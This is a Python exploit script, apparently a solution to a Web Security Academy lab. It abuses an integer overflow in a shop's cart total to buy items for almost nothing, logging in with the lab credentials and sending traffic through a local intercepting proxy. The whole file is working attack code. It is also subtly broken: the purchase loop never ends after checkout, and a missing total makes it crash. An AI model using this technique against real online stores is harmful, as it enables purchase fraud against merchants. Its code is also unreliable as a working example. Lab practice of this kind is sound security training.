from bs4 import BeautifulSoup
from urllib.parse import urljoin
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define Variables
base_url = 'https://0a7500de03e9a6368026581900950024.web-security-academy.net/'
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Get CSRF Token
def get_csrf_token(session, url):
  response = session.get(url, proxies=proxies, verify=False)
  csrf_token = BeautifulSoup(response.text, 'html.parser').find('input', {'name': 'csrf'}).get('value')
  return csrf_token

# Purchase Item
def purchase_item(session, url):
  # Login
  login_url = urljoin(base_url, 'login')
  login_csrf_token = get_csrf_token(session, login_url)
  login_payload = {'username': 'wiener', 'password': 'peter', 'csrf': login_csrf_token}
  login_response = session.post(login_url, data=login_payload, proxies=proxies, verify=False)

  if login_response.status_code == 200:
    cart_url = urljoin(base_url, 'cart')
    
    while True:
      # Add first item
      cart_payload1 = {'productId': '1', 'redir': 'PRODUCT', 'quantity': '99'}
      session.post(cart_url, data=cart_payload1, proxies=proxies, verify=False)

      # Check total
      total = get_total(session)
      if total < 0:
        # Add second item
        cart_payload2 = {'productId': '2', 'redir': 'PRODUCT', 'quantity': '99'}
        session.post(cart_url, data=cart_payload2, proxies=proxies, verify=False)

        # Check total again
        total = get_total(session)
        if 0 < total < 100:
          # Checkout
          checkout_url = urljoin(base_url, 'cart/checkout')
          checkout_csrf_token = get_csrf_token(session, cart_url)
          checkout_payload = {'csrf': checkout_csrf_token}
          checkout_response = session.post(checkout_url, data=checkout_payload, proxies=proxies, verify=False)
          if checkout_response.status_code == 200:
            print("Purchase successful!")
          else:
            print("Failed to checkout.")

  else:
    print("Failed to log in.")

def get_total(session):
  cart_url = urljoin(base_url, 'cart')
  response = session.get(cart_url, proxies=proxies, verify=False)
  soup = BeautifulSoup(response.content, 'html.parser')
  total_element = soup.find('th', string='Total:')
  if total_element:
    total_text = total_element.find_next_sibling('th').text
    total_value = total_text.replace('$', '')
    return float(total_value)
  else:
    return None

def main():
  session = requests.Session()
  purchase_item(session, base_url)

if __name__ == "__main__":
  main()
